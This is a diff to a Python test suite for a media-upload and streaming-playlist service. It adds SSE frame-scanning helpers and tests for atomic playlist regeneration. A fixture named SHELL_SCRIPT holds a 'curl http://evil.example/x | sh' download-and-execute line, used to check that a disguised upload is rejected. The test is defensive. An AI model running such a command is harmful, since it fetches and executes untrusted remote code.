@@ -8,6 +8,7 @@ the point of this file.
 
 from __future__ import annotations
 
+import asyncio
 import io
 import json
 import math
@@ -20,6 +21,7 @@ from pathlib import Path
 import pytest
 
 from ambient import uploads
+from ambient.events import CHANNEL_STATUS
 from ambient.media import AUDIO_EXTENSIONS, IMAGE_EXTENSIONS, MediaKind
 from ambient.models import AmbientConfig
 from ambient.uploads import (
@@ -33,6 +35,7 @@ from ambient.uploads import (
     sniff_audio,
 )
 from tests.conftest import AUTH
+from tests.test_config import CHANNEL_ENV, CHANNEL_YAML
 
 SHELL_SCRIPT = b"#!/bin/sh\ncurl http://evil.example/x | sh\n"
 
@@ -657,7 +660,30 @@ def test_upload_requires_a_token(api) -> None:
 
 # --------------------------------------------------------------------------
 # 10. SSE
+#
+# Frame order is not part of the contract. A host with a running channel has
+# the supervisor publishing `channel.status` into the same queue, so these
+# tests seed exactly that and then scan for the frame they care about.
 # --------------------------------------------------------------------------
+
+
+async def _status_first(state) -> None:
+    await state.events.publish(CHANNEL_STATUS, {"state": "running"}, channel="lofi")
+
+
+async def _take(queue) -> str:
+    return await asyncio.wait_for(queue.get(), 5.0)
+
+
+def frame_named(client, subscriber, name: str, limit: int = 20) -> dict:
+    """Read frames until the wanted event arrives; fail rather than hang."""
+    for _ in range(limit):
+        frame = client.portal.call(_take, subscriber.queue)
+        head, separator, body = frame.partition("\ndata: ")
+        assert separator and frame.endswith("\n\n")
+        if head == f"event: {name}":
+            return json.loads(body)
+    raise AssertionError(f"no {name!r} frame arrived")
 
 
 def test_an_upload_reaches_a_connected_sse_client(uploader) -> None:
@@ -671,13 +697,12 @@ def test_an_upload_reaches_a_connected_sse_client(uploader) -> None:
 
     subscriber = client.portal.call(open_subscription)
     try:
+        client.portal.call(_status_first, state)
         assert send(client, "images", [part("dusk.png", png_bytes())]).status_code == 200
-        frame = client.portal.call(subscriber.queue.get)
+        payload = frame_named(client, subscriber, "media.uploaded")
     finally:
         client.portal.call(holder["context"].__aexit__, None, None, None)
 
-    assert frame.startswith("event: media.uploaded\ndata: ")
-    payload = json.loads(frame.split("data: ", 1)[1])
     assert payload == {
         "channel": None,
         "at": payload["at"],
@@ -701,14 +726,14 @@ def test_a_channel_upload_names_the_channel_in_its_event(uploader) -> None:
 
     subscriber = client.portal.call(open_subscription)
     try:
+        client.portal.call(_status_first, state)
         assert send(
             client, "audio", [part("rain.wav", wav_bytes())], target="lofi"
         ).status_code == 200
-        frame = client.portal.call(subscriber.queue.get)
+        payload = frame_named(client, subscriber, "media.uploaded")
     finally:
         client.portal.call(holder["context"].__aexit__, None, None, None)
 
-    payload = json.loads(frame.split("data: ", 1)[1])
     assert payload["channel"] == "lofi" and payload["target"] == "lofi"
 
 
@@ -725,6 +750,131 @@ def test_an_upload_appears_in_a_folder_mode_channel(uploader, repo: Path) -> Non
     playlist = client.get("/api/channels/lofi/playlist", headers=AUTH).json()
     assert "/media/channel/audio/new track.wav" in playlist["container_paths"]
     assert playlist["tracks"] == []
+
+
+def make_channel(repo: Path, name: str, *, tracks: str = "[]", slides: str = "[]") -> Path:
+    directory = repo / "channels" / name
+    (directory / "audio").mkdir(parents=True)
+    (directory / "images").mkdir(parents=True)
+    (directory / "audio" / f"{name}-own.mp3").write_bytes(b"x")
+    (directory / "images" / f"{name}-own.jpg").write_bytes(b"x")
+    config = (
+        CHANNEL_YAML.replace("name: lofi", f"name: {name}")
+        .replace("tracks: []", f"tracks: {tracks}")
+        .replace("slides: []", f"slides: {slides}")
+    )
+    (directory / "config.yaml").write_text(config, encoding="utf-8")
+    (directory / ".env").write_text(CHANNEL_ENV.replace("/lofi", f"/{name}"), encoding="utf-8")
+    return directory
+
+
+def test_an_audio_upload_grows_the_playlist_by_exactly_one(uploader, repo: Path) -> None:
+    """The generated list is what Liquidsoap reads; the API view is not enough."""
+    client, _state = uploader
+    playlist = repo / "channels" / "lofi" / "playlist.m3u"
+    before = client.get("/api/channels/lofi/playlist", headers=AUTH).json()["container_paths"]
+
+    response = send(client, "audio", [part("new track.wav", wav_bytes())], target="lofi")
+    assert response.status_code == 200
+    assert response.json()["recompiled"] == ["lofi"]
+
+    lines = playlist.read_text(encoding="utf-8").splitlines()
+    assert len(lines) == len(before) + 1
+    assert "/media/channel/audio/new track.wav" in lines
+
+
+def test_an_image_upload_grows_the_images_list(uploader, repo: Path) -> None:
+    client, _state = uploader
+    images = repo / "channels" / "lofi" / "images.list"
+    before = client.get("/api/channels/lofi/images", headers=AUTH).json()["container_paths"]
+
+    response = send(client, "images", [part("dusk.png", png_bytes())], target="lofi")
+    assert response.status_code == 200
+    assert response.json()["recompiled"] == ["lofi"]
+
+    lines = images.read_text(encoding="utf-8").splitlines()
+    assert len(lines) == len(before) + 1
+    assert "/media/channel/images/dusk.png" in lines
+
+
+def test_an_upload_rewrites_only_the_list_of_its_own_kind(uploader, repo: Path) -> None:
+    client, _state = uploader
+    images = repo / "channels" / "lofi" / "images.list"
+    images.write_text("sentinel\n", encoding="utf-8")
+    assert send(
+        client, "audio", [part("new track.wav", wav_bytes())], target="lofi"
+    ).status_code == 200
+    assert images.read_text(encoding="utf-8") == "sentinel\n"
+
+
+def test_a_shared_upload_updates_the_channels_that_draw_from_common(
+    uploader, repo: Path
+) -> None:
+    """`common/` is shared, so one upload has to reach every channel selecting
+    from it — and no further. A pinned list is not watched and stays as written;
+    folder mode never pulls from `common/` at all, so it is not touched either.
+    """
+    client, _state = uploader
+    (repo / "common" / "audio" / "base.mp3").write_bytes(b"x")
+    shared = make_channel(repo, "shared", tracks='["common/audio/**"]')
+    pinned = make_channel(repo, "pinned", tracks='["channels/pinned/audio/pinned-own.mp3"]')
+    (shared / "playlist.m3u").write_text("stale\n", encoding="utf-8")
+    (pinned / "playlist.m3u").write_text("pinned by hand\n", encoding="utf-8")
+    lofi_playlist = repo / "channels" / "lofi" / "playlist.m3u"
+    lofi_playlist.write_text("folder mode\n", encoding="utf-8")
+
+    response = send(client, "audio", [part("shared.wav", wav_bytes())], target="common")
+    assert response.status_code == 200
+    assert response.json()["recompiled"] == ["shared"]
+
+    assert (shared / "playlist.m3u").read_text(encoding="utf-8").splitlines() == [
+        "/media/common/audio/base.mp3",
+        "/media/common/audio/shared.wav",
+    ]
+    assert (pinned / "playlist.m3u").read_text(encoding="utf-8") == "pinned by hand\n"
+    assert lofi_playlist.read_text(encoding="utf-8") == "folder mode\n"
+
+
+def test_a_fully_rejected_batch_recompiles_nothing(uploader, repo: Path) -> None:
+    client, _state = uploader
+    playlist = repo / "channels" / "lofi" / "playlist.m3u"
+    playlist.write_text("untouched\n", encoding="utf-8")
+
+    response = send(client, "audio", [part("payload.mp3", SHELL_SCRIPT)], target="lofi")
+    assert response.status_code == 400
+    assert response.json()["recompiled"] == []
+    assert playlist.read_text(encoding="utf-8") == "untouched\n"
+
+
+def test_the_playlist_is_never_observed_partial(
+    uploader, repo: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Liquidsoap watches this exact path, so it must go from whole to whole."""
+    client, _state = uploader
+    playlist = repo / "channels" / "lofi" / "playlist.m3u"
+    original = "/media/channel/audio/01 - a track.m4a\n"
+    playlist.write_text(original, encoding="utf-8")
+
+    real_replace = os.replace
+    published: list[tuple[Path, str]] = []
+
+    def recording_replace(src, dst):
+        if Path(dst) == playlist:
+            published.append((Path(src).parent, playlist.read_text(encoding="utf-8")))
+        return real_replace(src, dst)
+
+    monkeypatch.setattr(os, "replace", recording_replace)
+    assert send(
+        client, "audio", [part("new track.wav", wav_bytes())], target="lofi"
+    ).status_code == 200
+    monkeypatch.undo()
+
+    assert published, "the playlist was never rewritten"
+    for source_dir, contents in published:
+        assert source_dir == playlist.parent  # same directory, so rename() is atomic
+        assert contents == original  # still whole at the instant it was replaced
+    assert "new track.wav" in playlist.read_text(encoding="utf-8")
+    assert [p.name for p in playlist.parent.iterdir() if p.name.startswith(".playlist")] == []
 
 
 # --------------------------------------------------------------------------
@@ -1146,6 +1296,7 @@ def test_a_form_upload_reaches_a_connected_sse_client(uploader) -> None:
 
     subscriber = client.portal.call(open_subscription)
     try:
+        client.portal.call(_status_first, state)
         response = send_form(
             client,
             files=[("dusk.png", png_bytes())],
@@ -1154,12 +1305,10 @@ def test_a_form_upload_reaches_a_connected_sse_client(uploader) -> None:
             channel="lofi",
         )
         assert response.status_code == 200
-        frame = client.portal.call(subscriber.queue.get)
+        payload = frame_named(client, subscriber, "media.uploaded")
     finally:
         client.portal.call(holder["context"].__aexit__, None, None, None)
 
-    assert frame.startswith("event: media.uploaded\ndata: ")
-    payload = json.loads(frame.split("data: ", 1)[1])
     assert payload["channel"] == "lofi"
     assert payload["target"] == "lofi"
     assert payload["kind"] == "images"
